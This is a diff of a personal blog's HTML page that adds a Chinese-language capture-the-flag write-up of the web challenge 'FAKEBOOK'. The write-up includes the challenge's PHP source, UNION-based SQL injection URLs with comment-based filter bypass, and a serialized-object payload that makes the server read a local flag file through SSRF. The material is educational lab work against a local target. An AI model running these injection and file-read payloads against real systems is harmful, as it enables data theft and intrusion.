@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>xiaomeiqiu&#39;s Studio</title>
+    <title>网鼎杯第一场web_write_up · xiaomeiqiu&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,6 +77,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -201,14 +203,23 @@
 </head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">xiaomeiqiu&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">网鼎杯第一场web_write_up</a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">xiaomeiqiu's Studio.</a>
 </header>
@@ -227,17 +238,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            xiaomeiqiu's Studio.
-            <!-- 文章页  -->
+            网鼎杯第一场web_write_up
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -245,12 +256,43 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                Life is fantastic
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">801</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/06</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,395 +393,74 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/01/30/XXE攻击/">
-            
-                <span>XXE攻击</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h1><p>现在越来越多主要的web程序被发现和报告存在XXE（XML外部实体攻击）漏洞，比如说facebook，paypal等等。举个例子，我们扫一眼这些网站最近奖励的漏洞，充分证实了前面的说法。尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应得的关注度。很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。<br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/30</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="XXE">XXE</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/01/18/python-flaslk-web/">
-            
-                <span>Python-Flask-小项目</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="前言-："><a href="#前言-：" class="headerlink" title="[前言]："></a>[前言]：</h2><p>前些日子用python开发了一个简单的留言班，最后一个月学业繁忙忘了整理记录一波。今天整理温习一波，视频是参考b站上的大佬的，b站真是无所不能呀。<br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/18</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="FLASK">FLASK</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="WEB">WEB</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/21/python-inject/">
-            
-                <span>python-模板注入</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：最近突然有些疲惫，闲着我就去做一个小小开发，开发之后发现自己用的是jinj2。尝试一波sql注入，果然写好的框架不是这么好日的。接下来学习了下模板注入。
-[正文]：1.产生该漏洞的原因：程序猿设计问题让模板的变量可控。跟sql注入的原理差不多。程序员自己的疏忽！
-2.利用的条件：1.是利用jinja2，或者其他模板开发的。 2.模板中的部分变量，代码用户可控。
-3.常见的利用点：1.jinja2中的render_template_string，进行渲染字符串为模板的时候。示例代码如下：
-@app.errorhandler(404)
-def page_not_found(e):
-...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/21</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/14/python-flask-web-base/">
-            
-                <span>Python-flask-web基础</span>
-        </a>
-        <div class="abstract-content">
-            [Flask开发准备]：Python虚拟环境介绍与安装：因为python的版本更新的太快，flask的版本不兼容，一个虚拟环境对应一个falsk，就可以解决这个问题。
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="[前言]:"></a>[前言]:</h2><p>最前看了上海的比赛自闭了，准备最近好好复现下近些天比赛的题目。首先从网鼎杯第一场开始。</p>
+<h2 id="正文-："><a href="#正文-：" class="headerlink" title="[正文]："></a>[正文]：</h2><p>题目：FAKEBOOK 题目文件：链接：<a href="https://pan.baidu.com/s/1enihLDFa9JnLJ1eG_ZcK6Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1enihLDFa9JnLJ1eG_ZcK6Q</a> 密码：j6hh 扫一扫出来个user.php.bak（原谅我字典没扫到）还有个flag.php，然后得到user.php的代码。得到的代码如下。目前用不到接着往下做</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后看到注册正常操作注册一波。发现可以注册blog地址，随便写个<a href="http://www.baidu.com。登录后发现隐隐约约页面上有个www.baidu.com这个玩意。可能存在ssrf去把flag给读取出来。仔细一看urlhttp://127.0.0.1/facebook/view.php?no=1。sql注入？？？。尝试发现ok的手测过滤16进制以及union" target="_blank" rel="noopener">www.baidu.com。登录后发现隐隐约约页面上有个www.baidu.com这个玩意。可能存在ssrf去把flag给读取出来。仔细一看urlhttp://127.0.0.1/facebook/view.php?no=1。sql注入？？？。尝试发现ok的手测过滤16进制以及union</a> select，用/**/绕过。成功。最后的sql注入语句为：</p>
+<pre><code>http://127.0.0.1/facebook/view.php?no=0 union/**/select 1,2,3,4%23    //看回显
 
-安装虚拟环境：pip install virtualevn
+http://127.0.0.1/facebook/view.php?no=0 union/**/select 1,(SELECT+GROUP_CONCAT(schema_name)+FROM+INFORMATION_SCHEMA.SCHEMATA),3,4%23  //查数据库
 
-将虚拟环境安装到指定目录：virtualevn flask-evn
+http://127.0.0.1/facebook/view.php?no=0 union/**/select 1,(SELECT+GROUP_CONCAT(table_name)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),3,4%23  //查表
 
-激活flask ：进入安装的目录进入Scripts 输入active
-
-在虚拟环境中安装flask：pip install flask
-
-
-Pycharm的使用：创建一个新项目：选择刚才创建环境中的/bin/python.exe。也可以让pycharm自己创建一个flask虚拟环境
-第一个f...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/14</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
+http://127.0.0.1/facebook/view.php?no=0 union/**/select 1,(SELECT+GROUP_CONCAT(column_name)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=&apos;users&apos;),3,4%23  //查列
+</code></pre><p>然后发现blog列存储的是经过序列化的（当初就做到这）。</p>
+<pre><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;}
+</code></pre><p>结合前面的源代码，先反序列化data，然后用curl_exec访问我们的blog。我们可以注册blog的时候直接注册file://./flag.php。但是注册的时候有过滤。但是我们可以结合sql注入，在提取数据库中内容的同时将他覆盖。利用user.php去访问。故最后的payload为：</p>
+<pre><code>http://127.0.0.1/facebook/view.php?no=0 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:15:&quot;file://flag.txt&quot;;}&apos;%23
+</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="[总结]:"></a>[总结]:</h2><p>1.其实刚开始我是想用php://filter/read=convert.base64-encode/resource=flag.txt，emem（太菜）curl并不支持这些协议支持的协议。回去学习一波ssrf几个常用的函数。</p>
+<pre><code>dict，file，ftp，ftps，gopher，http，https，imap，imaps，ldap，ldaps，pop3，pop3s，rtsp，scp，sftp，smtp，smtps，telnet，tftp
+</code></pre><p>2.看了别人的wp。file协议不需要物理地址，只需要相对路径就行了。并且在php中win下”\“会被当做转义符，所以在写window路径是应该为\\,并且不算字符\的字符长度。举个栗子：</p>
+<pre><code>&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:40:&quot;file://D:\\phpStudy\\WWW\\facebook\\flag.txt&quot;;}
+</code></pre>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/07/java-web/">
-            
-                <span>JAVA-WEB-开发</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：最近写java作业老师要检查，那不能白白的浪费时间记录下自己开发学习过程，最后做个能看的javaweb项目。前端的就随便找个框架填上算了。
-[正文]：1.SERVERLET1.1 SERVERLET简介:
-
-Serverlet是位于Web服务器内部的，服务端的，独立于平台和协议的java应用程序，可以生成动态的web。
-Servlet是一个可信赖的程序，不受java安全性的控制，拥有和普通java应用程序一样的权限。
-Servlet是CGI Script的一种替代技术，由于Servlet在性能、可移植性、代码重用等方面比CGI具有显著的优势，因此在未来的技术发展过程中，Serv...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="23.105.208.131">xiaomeiqiu</a>
+            </p><p>原文链接：<a href="23.105.208.131/2018/11/06/网鼎杯-fakebook/">23.105.208.131/2018/11/06/网鼎杯-fakebook/</a>
+            </p><p>发表日期：<a href="23.105.208.131/2018/11/06/网鼎杯-fakebook/">十一月 6日 2018, 8:18:33 晚上</a>
+            </p><p>更新日期：<a href="23.105.208.131/2018/11/06/网鼎杯-fakebook/">January 6th 2020, 4:23:21 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/07</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/06/网鼎杯-fakebook/">
-            
-                <span>网鼎杯第一场web_write_up</span>
-        </a>
-        <div class="abstract-content">
-            [前言]:最前看了上海的比赛自闭了，准备最近好好复现下近些天比赛的题目。首先从网鼎杯第一场开始。
-[正文]：题目：FAKEBOOK 题目文件：链接：https://pan.baidu.com/s/1enihLDFa9JnLJ1eG_ZcK6Q 密码：j6hh 扫一扫出来个user.php.bak（原谅我字典没扫到）还有个flag.php，然后得到user.php的代码。得到的代码如下。目前用不到接着往下做
-1234567891011121314151617181920212223242526272829303132333435363738394041class UserInfo&#123...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/06</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/09/05/序列化/">
-            
-                <span>序列化与反序列化简单-晋级</span>
-        </a>
-        <div class="abstract-content">
-            序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize() 反序列化:恢复原先被序列化的变量 函数: unserialize()
-&lt;?php
-class QRQ{
-    public $data;
-    private $pass;
-    private $qrq=&quot;dasdasdas&quot;;
-    public $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;SAAB&quot;);
-    public $age=array(&quot;Pet...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/05</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/08/13/little-muma/">
-            
-                <span>ISCC国赛-一句话木马分析</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：北京iscc回来之后还没来得及时总结，比赛结果还是不错的国赛二等奖可以吹会了。但是更多的是收获，这次比赛发现web狗真是没法活下去了，比赛的web难的一批。除了第一个web我们做出来了，其他的我竟然都没扫描出来有高端口。。好像是6千几来着，回头复现下那个环境。第一个做出来也是千辛万苦呀，还是太菜，web狗表示打不动。应该有好多人看到一句话木马都没打动。真是这越来越难了，pwn大佬就是6上来干俩pwn虐爆全场，就在我们后面（每次好像都是），大佬在身后，萌新瑟瑟发抖。刚开始刷分的时候，基本上没几个得分的。本来想删他们的一句话木马，但是由于自己技术不熟练没种上，急于开心的刷flag没...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="php单双引号">php单双引号</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="木马">木马</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">
-            
-                <span>2018西普杯铁人三项河南赛区（数据分析赛）</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说下踩坑经历。第一次参加这种综合性比赛、数据赛、个人赛（主要是pwn）、企业赛，看到pwn没办法我们只能对他说再见（从头到尾连看都没看）。看似是一道文件上传题，n种姿势上传都失败，查看上传的文件发现什~$msf.doc、~$office.doc、……
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="流量分析">流量分析</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/04/08/SQL注入-Oderby注入/">
-            
-                <span>SQL注入-order by 注入</span>
-        </a>
-        <div class="abstract-content">
-            ##SQL注入-ORDERBY注入
-1，后台登录代码如下：123456789101112131415161718$username = $_POST['username'];$password = $_POST['password'];if(filter($username))&#123;    //过滤括号&#125;else&#123;    $sql="SELECT * FROM admin WHERE username='".$username."'";    $result=mysql_query($sql);    @$row = mysql_fetch_array($res...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/08</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src="https://raw.githubusercontent.com/xiaomeiqiu007/warm-photos/master/timg.jpg">
-    <div class="profile-name">xiaomeiqiu</div>
-    
-    <div class="profile-signature">
-        witness me
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/11/07/java-web/" title="JAVA-WEB-开发">
+                    <div class="nextTitle">JAVA-WEB-开发</div>
+                </a>
             
-                <a href="mailto:1870977163@qq.com" class="iconfont-archer email" title="email"></a>
+        </li>
+        <li class="previous">
             
-        
-    
-        
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/09/05/序列化/" title="序列化与反序列化简单-晋级">
+                    <div class="prevTitle">序列化与反序列化简单-晋级</div>
+                </a>
             
-                <a href="//github.com/xiaomeiqiu007" class="iconfont-archer github" target="_blank" title="github"></a>
-            
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
     
-        
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
     
 
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href="//www.lybsec.top" target="_black">friendA</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href="//www.77sec.cn" target="_black">friendB</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href="/about">ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -815,6 +536,24 @@ class QRQ{
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">[前言]:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文-："><span class="toc-number">2.</span> <span class="toc-text">[正文]：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">[总结]:</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1111,6 +850,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
